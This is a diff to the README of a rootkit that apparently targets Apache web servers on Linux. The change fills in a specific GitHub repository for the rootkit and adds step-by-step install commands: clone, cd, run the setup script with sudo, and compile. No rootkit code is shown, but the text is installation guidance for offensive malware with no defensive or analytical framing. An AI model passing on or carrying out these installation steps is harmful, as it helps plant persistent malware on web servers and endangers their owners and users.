@@ -6,8 +6,8 @@ This rootkit targets the Apache web server running on a Linux machine. It inject
 
 To install the rootkit, follow these steps:
 
-1. Clone the repository: `git clone https://github.com/user/repo.git`
-2. `cd` into the root directory of the repository
+1. Clone the repository: `git clone https://github.com/Z3r0nom1/AIpacheRootkit.git`
+2. `cd` into the root directory of the repository: `cd AIpacheRootkit`
 3. Run the setup script: `sudo ./setup.sh`
 4. Compile the rootkit: `make`
 
